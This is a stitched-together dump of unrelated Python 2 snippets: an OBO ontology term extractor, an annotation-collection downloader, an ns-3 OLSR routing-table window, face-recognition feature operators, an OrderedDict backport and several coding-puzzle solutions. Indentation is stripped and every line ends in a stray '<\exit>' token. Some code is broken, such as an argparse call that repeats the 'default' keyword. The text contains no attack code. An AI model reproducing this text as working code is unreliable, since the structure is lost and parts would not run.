elif re.match(r'^id:.*', l) and not skip_block:<\exit>
assert tid is None, str(ln)+' '+tid<\exit>
l = re.sub(r'\s*\!.*', '', l)<\exit>
m = re.match(r'^id: (([A-Za-z](?:\S*(?=:)|[A-Za-z_]*)):?\S+)\s*$', l)<\exit>
if m is None:<\exit>
print >> sys.stderr, "line %d: failed to match id, ignoring: %s" % (ln, l.rstrip())<\exit>
tid, prefix, name, synonyms, is_a, part_of, obsolete = None, None, None, [], [], [], False<\exit>
skip_block = True<\exit>
else:<\exit>
tid, prefix = m.groups()<\exit>
elif re.match(r'^name:.*', l) and not skip_block:<\exit>
assert tid is not None<\exit>
assert name is None<\exit>
m = re.match(r'^name: (.*?)\s*$', l)<\exit>
assert m is not None<\exit>
name = m.group(1)<\exit>
elif re.match(r'^is_a:.*', l) and not skip_block:<\exit>
assert tid is not None<\exit>
m = re.match(r'^is_a: (\S+) *(?:\{[^{}]*\} *)?(?:\!.*?)?\! *(.*?)\s*$', l)<\exit>
if m:<\exit>
is_a.append(m.groups())<\exit>
else:<\exit>
m = re.match(r'^is_a: (\S+)\s*$', l)<\exit>
if m is not None:<\exit>
is_a.append((m.group(1), None))<\exit>
else:<\exit>
print >> sys.stderr, "Error: failed to parse '%s'; ignoring is_a" % l<\exit>
elif re.match(r'^relationship:\s*\S*part_of', l) and not skip_block:<\exit>
assert tid is not None<\exit>
assert name is not None<\exit>
m = re.match(r'^relationship: +(?:OBO_REL:)?(\S+) +(\S+) *(?:\{[^{}]*\} *)?\! *(.*?)\s*$', l)<\exit>
if m:<\exit>
part_of.append(m.groups())<\exit>
else:<\exit>
m = re.match(r'^relationship: +(?:OBO_REL:)?(\S+) +(\S+)\s*$', l)<\exit>
if m is not None:<\exit>
part_of.append((m.group(1), m.group(2), None))<\exit>
else:<\exit>
print >> sys.stderr, "Error: failed to parse '%s'; ignoring part_of" % l<\exit>
elif re.match(r'^synonym:.*', l) and not skip_block:<\exit>
assert tid is not None<\exit>
assert name is not None<\exit>
m = re.match(r'^synonym: "(.*)" ([A-Za-z_ ]*?) *\[.*\]\s*$', l)<\exit>
assert m is not None, "Error: failed to parse '%s'" % l<\exit>
synstr, syntype = m.groups()<\exit>
if synstr == "":<\exit>
print >> sys.stderr, "Note: ignoring empty synonym on line %d: %s" % (ln, l.strip())<\exit>
else:<\exit>
synonyms.append((synstr,syntype))<\exit>
elif re.match(r'^def:.*', l) and not skip_block:<\exit>
assert tid is not None<\exit>
assert name is not None<\exit>
m = re.match(r'^def: "(.*)" *\[.*\]\s*$', l)<\exit>
assert m is not None, "Error: failed to parse '%s'" % l<\exit>
definition = m.group(1)<\exit>
if definition == "":<\exit>
print >> sys.stderr, "Note: ignoring empty def on line %d: %s" % (ln, l.strip())<\exit>
else:<\exit>
definitions.append(definition)<\exit>
elif re.match(r'^is_obsolete:', l):<\exit>
m = re.match(r'^is_obsolete:\s*true', l)<\exit>
if m:<\exit>
obsolete = True<\exit>
elif re.match(r'^\s*$', l):<\exit>
if (tid is None and prefix is None and name is None and<\exit>
synonyms == [] and definitions == [] and<\exit>
is_a == [] and part_of == []):<\exit>
continue<\exit>
if (obsolete or<\exit>
(limit_prefixes is not None and prefix not in limit_prefixes)):<\exit>
tid, prefix, name, synonyms, definitions, is_a, part_of, obsolete = None, None, None, [], [], [], [], False<\exit>
elif not skip_block:<\exit>
assert tid is not None, "line %d: no ID for '%s'!" % (ln, name)<\exit>
if name is None and not include_nameless:<\exit>
print >> sys.stderr, "Note: ignoring term without name (%s) on line %d" % (tid, ln)<\exit>
else:<\exit>
if tid not in term_by_id:<\exit>
t = Term(tid, name, synonyms, definitions,<\exit>
is_a, part_of)<\exit>
all_terms.append(t)<\exit>
term_by_id[tid] = t<\exit>
else:<\exit>
print >> sys.stderr, "Error: duplicate ID '%s'; discarding all but first definition" % tid<\exit>
tid, prefix, name, synonyms, definitions, is_a, part_of, obsolete = None, None, None, [], [], [], [], False<\exit>
else:<\exit>
pass<\exit>
else:<\exit>
pass<\exit>
assert tid is None<\exit>
assert name is None<\exit>
assert is_a == []<\exit>
return all_terms, term_by_id<\exit>
def argparser():<\exit>
import argparse<\exit>
ap=argparse.ArgumentParser(description="Extract terms from OBO ontology.")<\exit>
ap.add_argument("-l", "--limit", default=None, metavar="PREFIX", help="Limit processing to given ontology prefix or prefixes (multiple separated by \"|\").")<\exit>
ap.add_argument("-d", "--depth", default=None, metavar="INT", help="Limit extraction to given depth from initial nodes.")<\exit>
ap.add_argument("-nc", "--no-case-normalization", default=False, action="store_true", help="Skip heuristic case normalization of ontology terms.")<\exit>
ap.add_argument("-nm", "--no-multiple-inheritance", default=False, action="store_true", help="Exclude subtrees involving multiple inheritance.")<\exit>
ap.add_argument("-ns", "--no-synonyms", default=False, action="store_true", help="Do not extract synonyms.")<\exit>
ap.add_argument("-nd", "--no-definitions", default=False, action="store_true", help="Do not extract definitions.")<\exit>
ap.add_argument("-e", "--exclude", default=[], metavar="TERM", nargs="+", help="Exclude subtrees rooted at given TERMs.")<\exit>
ap.add_argument("-s", "--separate-children", default=[], default=False, action="store_true", help="Separate subontologies found as children of the given term.")<\exit>
ap.add_argument("file", metavar="OBO-FILE", help="Source ontology.")<\exit>
ap.add_argument("-p", "--separate-parents", default=[], default=False, action="store_true", help="Separate subontologies of parents of the given terms.")<\exit>
ap.add_argument("terms", default=[], metavar="TERM", nargs="*", help="Root terms from which to extract.")<\exit>
return ap<\exit>
multiple_parent_skip_count = 0<\exit>
def get_subtree_terms(root, collection=None, depth=0):<\exit>
global options<\exit>
global multiple_parent_skip_count<\exit>
if collection is None:<\exit>
collection = []<\exit>
if root.traversed or root.excluded:<\exit>
return False<\exit>
if options.depth is not None and depth > options.depth:<\exit>
return False<\exit>
if options.no_multiple_inheritance and len(root.parents) > 1:<\exit>
if multiple_parent_skip_count < 10:<\exit>
print >> sys.stderr, "Note: not traversing subtree at %s %s: %d parents" % (root.tid, root.name, len(root.parents))<\exit>
elif multiple_parent_skip_count == 10:<\exit>
print >> sys.stderr, "(further 'not traversing subtree; multiple parents' notes suppressed)"<\exit>
multiple_parent_skip_count += 1<\exit>
return False<\exit>
root.traversed = True<\exit>
collection.append(root)<\exit>
for child in root.children:<\exit>
get_subtree_terms(child, collection, depth+1)<\exit>
return collection<\exit>
def exclude_subtree(root):<\exit>
if root.traversed:<\exit>
return False<\exit>
root.traversed = True<\exit>
root.excluded = True<\exit>
for child in root.children:<\exit>
exclude_subtree(child)<\exit>
def main(argv=None):<\exit>
global options<\exit>
arg = argparser().parse_args(argv[1:])<\exit>
options = arg<\exit>
if arg.depth is not None:<\exit>
arg.depth = int(arg.depth)<\exit>
assert arg.depth > 0, "Depth limit cannot be less than or equal to zero"<\exit>
limit_prefix = arg.limit<\exit>
if limit_prefix is None:<\exit>
limit_prefixes = None<\exit>
else:<\exit>
limit_prefixes = limit_prefix.split("|")<\exit>
fn = arg.file<\exit>
if not arg.no_case_normalization:<\exit>
for i in range(len(arg.terms)):<\exit>
arg.terms[i] = case_normalize_initial(arg.terms[i])<\exit>
f = open(fn)<\exit>
all_terms, term_by_id = parse_obo(f, limit_prefixes)<\exit>
for t in all_terms:<\exit>
t.resolve_references(term_by_id)<\exit>
if not arg.no_case_normalization:<\exit>
for t in all_terms:<\exit>
if t.obo_idspace() in ("FMA", "WBbt"):<\exit>
t.case_normalize_initial()<\exit>
elif t.obo_idspace() == "SAO":<\exit>
t.case_normalize_all_words()<\exit>
print >> sys.stderr, "OK, parsed %d (non-obsolete) terms." % len(all_terms)<\exit>
term_by_name = {}<\exit>
for t in all_terms:<\exit>
if t.name not in term_by_name:<\exit>
term_by_name[t.name] = t<\exit>
else:<\exit>
print >> sys.stderr, "Warning: duplicate name '%s'; no name->ID mapping possible" % t.name<\exit>
term_by_name[t.name] = None<\exit>
for rootterm in arg.terms:<\exit>
assert arg.separate_parents or rootterm in term_by_name, "Error: given term '%s' not found (or obsolete) in ontology!" % rootterm<\exit>
for t in all_terms:<\exit>
t.children = []<\exit>
t.parents  = []<\exit>
for t in all_terms:<\exit>
for ptid, pname in t.is_a:<\exit>
if ptid not in term_by_id:<\exit>
print >> sys.stderr, "Error: is_a term '%s' not found, removing" % ptid<\exit>
continue<\exit>
parent = term_by_id[ptid]<\exit>
if pname is not None and pname in term_by_name and term_by_name[pname] is not None:<\exit>
if parent != term_by_name[pname]:<\exit>
print >> sys.stderr, "Warning: given parent name '%s' mismatches parent term name (via ID) '%s'" % (parent.name, pname)<\exit>
if t in parent.children:<\exit>
print >> sys.stderr, "Warning: ignoring dup parent %s for %s" % (ptid, str(t))<\exit>
else:<\exit>
t.parents.append(parent)<\exit>
parent.children.append(t)<\exit>
for t in all_terms:<\exit>
t.traversed = False<\exit>
t.excluded  = False<\exit>
for excludeterm in arg.exclude:<\exit>
assert excludeterm in term_by_name, "Error: exclude term '%s' not found (or obsolete) in ontology!" % excludeterm<\exit>
exclude_subtree(term_by_name[excludeterm])<\exit>
for t in all_terms:<\exit>
t.traversed = False<\exit>
rootterms = []<\exit>
if not arg.separate_parents:<\exit>
for t in arg.terms:<\exit>
if t not in term_by_name:<\exit>
print >> sys.stderr, "Error: given term '%s' not found!" % t<\exit>
return 1<\exit>
else:<\exit>
rootterms.append(term_by_name[t])<\exit>
if len(rootterms) == 0:<\exit>
for t in all_terms:<\exit>
if len(t.parents) == 0:<\exit>
rootterms.append(t)<\exit>
print >> sys.stderr, "Extracting from %d root terms." % len(rootterms)<\exit>
else:<\exit>
assert not arg.separate_children, "Incompatible arguments"<\exit>
unique_parents = {}<\exit>
for t in arg.terms:<\exit>
if t in term_by_name:<\exit>
for p in term_by_name[t].parents:<\exit>
unique_parents[p] = True<\exit>
assert len(unique_parents) != 0, "Failed to find any of given terms"<\exit>
for p in unique_parents:<\exit>
p.excluded = True<\exit>
rootterms = [p for p in unique_parents]<\exit>
rootterms.sort(lambda a,b: cmp(a.name,b.name))<\exit>
arg.separate_children = True<\exit>
print >> sys.stderr, "Splitting at the following:", ",".join(rootterms)<\exit>
for rootterm in rootterms:<\exit>
if not arg.separate_children:<\exit>
for t in get_subtree_terms(rootterm):<\exit>
strs = []<\exit>
strs.append("name:Name:"+t.name)<\exit>
if not arg.no_synonyms:<\exit>
for synstr, syntype in t.synonyms:<\exit>
strs.append("name:Synonym:"+synstr)<\exit>
if not arg.no_definitions:<\exit>
for d in t.defs:<\exit>
strs.append("info:Definition:"+d)<\exit>
id_ = t.tid.replace(t.obo_idspace()+':', '', 1)<\exit>
print id_ + '\t' + '\t'.join(strs)<\exit>
else:<\exit>
for c in rootterm.children:<\exit>
stt = []<\exit>
get_subtree_terms(c, stt)<\exit>
for n, tid, ntype in stt:<\exit>
print "%s\t%s\t%s\t%s" % (c.name, n, tid, ntype)<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import sys<\exit>
from urlparse import urlparse, urljoin<\exit>
from os.path import dirname, join as joinpath<\exit>
from os import makedirs<\exit>
from urllib import urlopen<\exit>
from simplejson import loads<\exit>
try:<\exit>
base_url = sys.argv[1]<\exit>
url = urlparse(base_url)<\exit>
except:<\exit>
print sys.argv[1]<\exit>
print "Syntax: %s <url>" % sys.argv[0]<\exit>
sys.exit(1)<\exit>
this_dir = dirname(sys.argv[0])<\exit>
datadir = joinpath(this_dir, '../offline_data')<\exit>
coll_and_doc = url.fragment<\exit>
coll = dirname(coll_and_doc)[1:]<\exit>
def convert_coll(coll):<\exit>
if coll == '':<\exit>
ajax_coll = '/'<\exit>
else:<\exit>
ajax_coll = '/%s/' % coll<\exit>
coll_query_url = urljoin(base_url, 'ajax.cgi?action=getCollectionInformation&collection=%s' % ajax_coll)<\exit>
coll_dir = joinpath(datadir, coll)<\exit>
try:<\exit>
makedirs(coll_dir)<\exit>
except:<\exit>
pass<\exit>
print ajax_coll<\exit>
conn = urlopen(coll_query_url)<\exit>
jsonp = conn.read()<\exit>
conn.close<\exit>
with open(joinpath(coll_dir, 'collection.js'), 'w') as f:<\exit>
f.write("jsonp=")<\exit>
f.write(jsonp)<\exit>
coll_data = loads(jsonp)<\exit>
for item in coll_data['items']:<\exit>
if item[0] == 'd':<\exit>
doc = item[2]<\exit>
print "  %s" % doc<\exit>
doc_query_url = urljoin(base_url, 'ajax.cgi?action=getDocument&collection=%s&document=%s' % (ajax_coll, doc))<\exit>
conn = urlopen(doc_query_url)<\exit>
jsonp = conn.read()<\exit>
conn.close<\exit>
with open(joinpath(coll_dir, '%s.data.js' % doc), 'w') as f:<\exit>
f.write("jsonp=")<\exit>
f.write(jsonp)<\exit>
elif item[0] == 'c' and item[2] != '..':<\exit>
convert_coll(item[2])<\exit>
convert_coll(coll)<\exit>
import gtk<\exit>
import ns.core<\exit>
import ns.network<\exit>
import ns.internet<\exit>
import ns.olsr<\exit>
from visualizer.base import InformationWindow<\exit>
class ShowOlsrRoutingTable(InformationWindow):<\exit>
(<\exit>
COLUMN_DESTINATION,<\exit>
COLUMN_NEXT_HOP,<\exit>
COLUMN_INTERFACE,<\exit>
COLUMN_NUM_HOPS,<\exit>
) = range(4)<\exit>
def __init__(self, visualizer, node_index):<\exit>
InformationWindow.__init__(self)<\exit>
self.win = gtk.Dialog(parent=visualizer.window,<\exit>
flags=gtk.DIALOG_DESTROY_WITH_PARENT|gtk.DIALOG_NO_SEPARATOR,<\exit>
buttons=(gtk.STOCK_CLOSE, gtk.RESPONSE_CLOSE))<\exit>
self.win.set_default_size(gtk.gdk.screen_width()/2, gtk.gdk.screen_height()/2)<\exit>
self.win.connect("response", self._response_cb)<\exit>
self.win.set_title("OLSR routing table for node %i" % node_index)<\exit>
self.visualizer = visualizer<\exit>
self.node_index = node_index<\exit>
self.table_model = gtk.ListStore(str, str, str, int)<\exit>
treeview = gtk.TreeView(self.table_model)<\exit>
treeview.show()<\exit>
sw = gtk.ScrolledWindow()<\exit>
sw.set_properties(hscrollbar_policy=gtk.POLICY_AUTOMATIC,<\exit>
vscrollbar_policy=gtk.POLICY_AUTOMATIC)<\exit>
sw.show()<\exit>
sw.add(treeview)<\exit>
self.win.vbox.add(sw)<\exit>
column = gtk.TreeViewColumn('Destination', gtk.CellRendererText(),<\exit>
text=self.COLUMN_DESTINATION)<\exit>
treeview.append_column(column)<\exit>
column = gtk.TreeViewColumn('Next hop', gtk.CellRendererText(),<\exit>
text=self.COLUMN_NEXT_HOP)<\exit>
treeview.append_column(column)<\exit>
column = gtk.TreeViewColumn('Interface', gtk.CellRendererText(),<\exit>
text=self.COLUMN_INTERFACE)<\exit>
treeview.append_column(column)<\exit>
column = gtk.TreeViewColumn('Num. Hops', gtk.CellRendererText(),<\exit>
text=self.COLUMN_NUM_HOPS)<\exit>
treeview.append_column(column)<\exit>
self.visualizer.add_information_window(self)<\exit>
self.win.show()<\exit>
def _response_cb(self, win, response):<\exit>
self.win.destroy()<\exit>
self.visualizer.remove_information_window(self)<\exit>
def update(self):<\exit>
node = ns.network.NodeList.GetNode(self.node_index)<\exit>
olsr = node.GetObject(ns.olsr.olsr.RoutingProtocol.GetTypeId())<\exit>
ipv4 = node.GetObject(ns.internet.Ipv4.GetTypeId())<\exit>
if olsr is None:<\exit>
return<\exit>
self.table_model.clear()<\exit>
for route in olsr.GetRoutingTableEntries():<\exit>
tree_iter = self.table_model.append()<\exit>
netdevice = ipv4.GetNetDevice(route.interface)<\exit>
if netdevice is None:<\exit>
interface_name = 'lo'<\exit>
else:<\exit>
interface_name = ns.core.Names.FindName(netdevice)<\exit>
if not interface_name:<\exit>
interface_name = "(interface %i)" % route.interface<\exit>
self.table_model.set(tree_iter,<\exit>
self.COLUMN_DESTINATION, str(route.destAddr),<\exit>
self.COLUMN_NEXT_HOP, str(route.nextAddr),<\exit>
self.COLUMN_INTERFACE, interface_name,<\exit>
self.COLUMN_NUM_HOPS, route.distance)<\exit>
def populate_node_menu(viz, node, menu):<\exit>
ns3_node = ns.network.NodeList.GetNode(node.node_index)<\exit>
olsr = ns3_node.GetObject(ns.olsr.olsr.RoutingProtocol.GetTypeId())<\exit>
if olsr is None:<\exit>
print "No OLSR"<\exit>
return<\exit>
menu_item = gtk.MenuItem("Show OLSR Routing Table")<\exit>
menu_item.show()<\exit>
def _show_ipv4_routing_table(dummy_menu_item):<\exit>
ShowOlsrRoutingTable(viz, node.node_index)<\exit>
menu_item.connect("activate", _show_ipv4_routing_table)<\exit>
menu.add(menu_item)<\exit>
def register(viz):<\exit>
viz.connect("populate-node-menu", populate_node_menu)<\exit>
from facerec_py.facerec.feature import AbstractFeature<\exit>
import numpy as np<\exit>
class FeatureOperator(AbstractFeature):<\exit>
def __init__(self, model1, model2):<\exit>
if (not isinstance(model1, AbstractFeature)) or (not isinstance(model2, AbstractFeature)):<\exit>
raise Exception("A FeatureOperator only works on classes implementing an AbstractFeature!")<\exit>
self.model1 = model1<\exit>
self.model2 = model2<\exit>
def __repr__(self):<\exit>
return "FeatureOperator(" + repr(self.model1) + "," + repr(self.model2) + ")"<\exit>
class ChainOperator(FeatureOperator):<\exit>
def __init__(self, model1, model2):<\exit>
FeatureOperator.__init__(self, model1, model2)<\exit>
def compute(self, X, y):<\exit>
X = self.model1.compute(X, y)<\exit>
return self.model2.compute(X, y)<\exit>
def extract(self, X):<\exit>
X = self.model1.extract(X)<\exit>
return self.model2.extract(X)<\exit>
def __repr__(self):<\exit>
return "ChainOperator(" + repr(self.model1) + "," + repr(self.model2) + ")"<\exit>
class CombineOperator(FeatureOperator):<\exit>
def __init__(self, model1, model2):<\exit>
FeatureOperator.__init__(self, model1, model2)<\exit>
def compute(self, X, y):<\exit>
A = self.model1.compute(X, y)<\exit>
B = self.model2.compute(X, y)<\exit>
C = []<\exit>
for i in range(0, len(A)):<\exit>
ai = np.asarray(A[i]).reshape(1, -1)<\exit>
bi = np.asarray(B[i]).reshape(1, -1)<\exit>
C.append(np.hstack((ai, bi)))<\exit>
return C<\exit>
def extract(self, X):<\exit>
ai = self.model1.extract(X)<\exit>
bi = self.model2.extract(X)<\exit>
ai = np.asarray(ai).reshape(1, -1)<\exit>
bi = np.asarray(bi).reshape(1, -1)<\exit>
return np.hstack((ai, bi))<\exit>
def __repr__(self):<\exit>
return "CombineOperator(" + repr(self.model1) + "," + repr(self.model2) + ")"<\exit>
class CombineOperatorND(FeatureOperator):<\exit>
def __init__(self, model1, model2, hstack=True):<\exit>
FeatureOperator.__init__(self, model1, model2)<\exit>
self._hstack = hstack<\exit>
def compute(self, X, y):<\exit>
A = self.model1.compute(X, y)<\exit>
B = self.model2.compute(X, y)<\exit>
C = []<\exit>
for i in range(0, len(A)):<\exit>
if self._hstack:<\exit>
C.append(np.hstack((A[i], B[i])))<\exit>
else:<\exit>
C.append(np.vstack((A[i], B[i])))<\exit>
return C<\exit>
def extract(self, X):<\exit>
ai = self.model1.extract(X)<\exit>
bi = self.model2.extract(X)<\exit>
if self._hstack:<\exit>
return np.hstack((ai, bi))<\exit>
return np.vstack((ai, bi))<\exit>
def __repr__(self):<\exit>
return "CombineOperatorND(" + repr(self.model1) + "," + repr(self.model2) + ", hstack=" + str(<\exit>
self._hstack) + ")"<\exit>
try:<\exit>
from thread import get_ident as _get_ident<\exit>
except ImportError:<\exit>
from dummy_thread import get_ident as _get_ident<\exit>
try:<\exit>
from _abcoll import KeysView, ValuesView, ItemsView<\exit>
except ImportError:<\exit>
pass<\exit>
class OrderedDict(dict):<\exit>
'Dictionary that remembers insertion order'<\exit>
def __init__(self, *args, **kwds):<\exit>
if len(args) > 1:<\exit>
raise TypeError('expected at most 1 arguments, got %d' % len(args))<\exit>
try:<\exit>
self.__root<\exit>
except AttributeError:<\exit>
self.__root = root = []<\exit>
root[:] = [root, root, None]<\exit>
self.__map = {}<\exit>
self.__update(*args, **kwds)<\exit>
def __setitem__(self, key, value, dict_setitem=dict.__setitem__):<\exit>
'od.__setitem__(i, y) <==> od[i]=y'<\exit>
if key not in self:<\exit>
root = self.__root<\exit>
last = root[0]<\exit>
last[1] = root[0] = self.__map[key] = [last, root, key]<\exit>
dict_setitem(self, key, value)<\exit>
def __delitem__(self, key, dict_delitem=dict.__delitem__):<\exit>
'od.__delitem__(y) <==> del od[y]'<\exit>
dict_delitem(self, key)<\exit>
link_prev, link_next, key = self.__map.pop(key)<\exit>
link_prev[1] = link_next<\exit>
link_next[0] = link_prev<\exit>
def __iter__(self):<\exit>
'od.__iter__() <==> iter(od)'<\exit>
root = self.__root<\exit>
curr = root[1]<\exit>
while curr is not root:<\exit>
yield curr[2]<\exit>
curr = curr[1]<\exit>
def __reversed__(self):<\exit>
'od.__reversed__() <==> reversed(od)'<\exit>
root = self.__root<\exit>
curr = root[0]<\exit>
while curr is not root:<\exit>
yield curr[2]<\exit>
curr = curr[0]<\exit>
def clear(self):<\exit>
'od.clear() -> None.  Remove all items from od.'<\exit>
try:<\exit>
for node in self.__map.itervalues():<\exit>
del node[:]<\exit>
root = self.__root<\exit>
root[:] = [root, root, None]<\exit>
self.__map.clear()<\exit>
except AttributeError:<\exit>
pass<\exit>
dict.clear(self)<\exit>
def popitem(self, last=True):<\exit>
if not self:<\exit>
raise KeyError('dictionary is empty')<\exit>
root = self.__root<\exit>
if last:<\exit>
link = root[0]<\exit>
link_prev = link[0]<\exit>
link_prev[1] = root<\exit>
root[0] = link_prev<\exit>
else:<\exit>
link = root[1]<\exit>
link_next = link[1]<\exit>
root[1] = link_next<\exit>
link_next[0] = root<\exit>
key = link[2]<\exit>
del self.__map[key]<\exit>
value = dict.pop(self, key)<\exit>
return key, value<\exit>
def keys(self):<\exit>
'od.keys() -> list of keys in od'<\exit>
return list(self)<\exit>
def values(self):<\exit>
'od.values() -> list of values in od'<\exit>
return [self[key] for key in self]<\exit>
def items(self):<\exit>
'od.items() -> list of (key, value) pairs in od'<\exit>
return [(key, self[key]) for key in self]<\exit>
def iterkeys(self):<\exit>
'od.iterkeys() -> an iterator over the keys in od'<\exit>
return iter(self)<\exit>
def itervalues(self):<\exit>
'od.itervalues -> an iterator over the values in od'<\exit>
for k in self:<\exit>
yield self[k]<\exit>
def iteritems(self):<\exit>
'od.iteritems -> an iterator over the (key, value) items in od'<\exit>
for k in self:<\exit>
yield (k, self[k])<\exit>
def update(*args, **kwds):<\exit>
if len(args) > 2:<\exit>
raise TypeError('update() takes at most 2 positional '<\exit>
'arguments (%d given)' % (len(args),))<\exit>
elif not args:<\exit>
raise TypeError('update() takes at least 1 argument (0 given)')<\exit>
self = args[0]<\exit>
other = ()<\exit>
if len(args) == 2:<\exit>
other = args[1]<\exit>
if isinstance(other, dict):<\exit>
for key in other:<\exit>
self[key] = other[key]<\exit>
elif hasattr(other, 'keys'):<\exit>
for key in other.keys():<\exit>
self[key] = other[key]<\exit>
else:<\exit>
for key, value in other:<\exit>
self[key] = value<\exit>
for key, value in kwds.items():<\exit>
self[key] = value<\exit>
__update = update<\exit>
__marker = object()<\exit>
def pop(self, key, default=__marker):<\exit>
if key in self:<\exit>
result = self[key]<\exit>
del self[key]<\exit>
return result<\exit>
if default is self.__marker:<\exit>
raise KeyError(key)<\exit>
return default<\exit>
def setdefault(self, key, default=None):<\exit>
'od.setdefault(k[,d]) -> od.get(k,d), also set od[k]=d if k not in od'<\exit>
if key in self:<\exit>
return self[key]<\exit>
self[key] = default<\exit>
return default<\exit>
def __repr__(self, _repr_running={}):<\exit>
'od.__repr__() <==> repr(od)'<\exit>
call_key = id(self), _get_ident()<\exit>
if call_key in _repr_running:<\exit>
return '...'<\exit>
_repr_running[call_key] = 1<\exit>
try:<\exit>
if not self:<\exit>
return '%s()' % (self.__class__.__name__,)<\exit>
return '%s(%r)' % (self.__class__.__name__, self.items())<\exit>
finally:<\exit>
del _repr_running[call_key]<\exit>
def __reduce__(self):<\exit>
'Return state information for pickling'<\exit>
items = [[k, self[k]] for k in self]<\exit>
inst_dict = vars(self).copy()<\exit>
for k in vars(OrderedDict()):<\exit>
inst_dict.pop(k, None)<\exit>
if inst_dict:<\exit>
return (self.__class__, (items,), inst_dict)<\exit>
return self.__class__, (items,)<\exit>
def copy(self):<\exit>
'od.copy() -> a shallow copy of od'<\exit>
return self.__class__(self)<\exit>
@classmethod<\exit>
def fromkeys(cls, iterable, value=None):<\exit>
d = cls()<\exit>
for key in iterable:<\exit>
d[key] = value<\exit>
return d<\exit>
def __eq__(self, other):<\exit>
if isinstance(other, OrderedDict):<\exit>
return len(self)==len(other) and self.items() == other.items()<\exit>
return dict.__eq__(self, other)<\exit>
def __ne__(self, other):<\exit>
return not self == other<\exit>
def viewkeys(self):<\exit>
"od.viewkeys() -> a set-like object providing a view on od's keys"<\exit>
return KeysView(self)<\exit>
def viewvalues(self):<\exit>
"od.viewvalues() -> an object providing a view on od's values"<\exit>
return ValuesView(self)<\exit>
def viewitems(self):<\exit>
"od.viewitems() -> a set-like object providing a view on od's items"<\exit>
return ItemsView(self)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, K, lst = cipher<\exit>
hm = {}<\exit>
for val in lst:<\exit>
if val in hm:<\exit>
hm[val] += 1<\exit>
else:<\exit>
hm[val] = 1<\exit>
cnt = 0<\exit>
for val in lst:<\exit>
target = val + K<\exit>
if target in hm:<\exit>
cnt += hm[target]<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N, K = map(int, f.readline().strip().split(' '))<\exit>
lst = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, K, lst<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution_TLE(object):<\exit>
def solve(self, cipher):<\exit>
for i in xrange(len(cipher)):<\exit>
if self.__is_palindrome(cipher[:i] + cipher[i + 1:]):<\exit>
return i<\exit>
return -1<\exit>
def __is_palindrome(self, s):<\exit>
return s == s[::-1]<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
l = len(cipher)<\exit>
start = 0<\exit>
end = l - 1<\exit>
while start < end and cipher[start] == cipher[end]:<\exit>
start += 1<\exit>
end -= 1<\exit>
if self.__is_palindrome(cipher[:start] + cipher[start + 1:]):<\exit>
return start<\exit>
if self.__is_palindrome(cipher[:end] + cipher[end + 1:]):<\exit>
return end<\exit>
if start >= end:<\exit>
return -1<\exit>
def __is_palindrome(self, s):<\exit>
return s == s[::-1]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution:<\exit>
def partition(self, s):<\exit>
ret = []<\exit>
self.backtrack(s, [], ret)<\exit>
return ret<\exit>
def backtrack(self, s, cur_lvl, ret):<\exit>
if not s:<\exit>
ret.append(list(cur_lvl))<\exit>
for i in xrange(1, len(s)+1):<\exit>
if self.predicate(s[:i]):<\exit>
cur_lvl.append(s[:i])<\exit>
self.backtrack(s[i:], cur_lvl, ret)<\exit>
cur_lvl.pop()<\exit>
def predicate(self, s):<\exit>
return s == s[::-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().partition("aabbc") == [['a', 'a', 'b', 'b', 'c'], ['a', 'a', 'bb', 'c'], ['aa', 'b', 'b', 'c'], ['aa', 'bb', 'c']]<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
bucket = [False for _ in xrange(26)]<\exit>
for char in cipher:<\exit>
char = char.lower()<\exit>
ind = ord(char) - ord('a')<\exit>
try:<\exit>
bucket[ind] = True<\exit>
except IndexError:<\exit>
pass<\exit>
is_pangram = all(bucket)<\exit>
if is_pangram:<\exit>
return "pangram"<\exit>
else:<\exit>
return "not pangram"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = 1<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import numpy as np<\exit>
def parzen_estimation(x_samples, point_x, h):<\exit>
k_n = 0<\exit>
for row in x_samples:<\exit>
x_i = (point_x - row[:, np.newaxis]) / h<\exit>
for row in x_i:<\exit>
if np.abs(row) > 1/2:<\exit>
break<\exit>
else:<\exit>
k_n += 1<\exit>
return (k_n / len(x_samples)) / (h**point_x.shape[1])<\exit>
class Image(object):<\exit>
def __init__(self, id, caption, url):<\exit>
self.id = id<\exit>
self.caption = caption<\exit>
self.url = url<\exit>
class Image(object):<\exit>
__slots__ = ['id', 'caption', 'url']<\exit>
def __init__(self, id, caption, url):<\exit>
self.id = id<\exit>
self.caption = caption<\exit>
self.url = url<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def permutationIndexII(self, A):<\exit>
idx = 0<\exit>
factor = 1<\exit>
cnt = defaultdict(int)<\exit>
cnt[A[-1]] += 1<\exit>
n = len(A)<\exit>
for i in xrange(n-2, -1, -1):<\exit>
cnt[A[i]] += 1<\exit>
for k, v in cnt.items():<\exit>
if k < A[i]:<\exit>
idx += v * factor / cnt[A[i]]<\exit>
factor = factor * (n-i) / cnt[A[i]]<\exit>
return idx+1<\exit>
if __name__ == "__main__":<\exit>
print Solution().permutationIndexII([1, 4, 2, 2])<\exit>
import math<\exit>
class Solution:<\exit>
def permutationIndex(self, A):<\exit>
n = len(A)<\exit>
idx = 0<\exit>
for i, v in enumerate(A):<\exit>
inv = 0<\exit>
for j in xrange(i+1, n):<\exit>
if A[i] > A[j]:<\exit>
inv += 1<\exit>
idx += inv * math.factorial(n-1-i)<\exit>
return idx+1<\exit>
import math<\exit>
class Solution:<\exit>
def getPermutation(self, n, k):<\exit>
k -= 1<\exit>
array = range(1, n+1)<\exit>
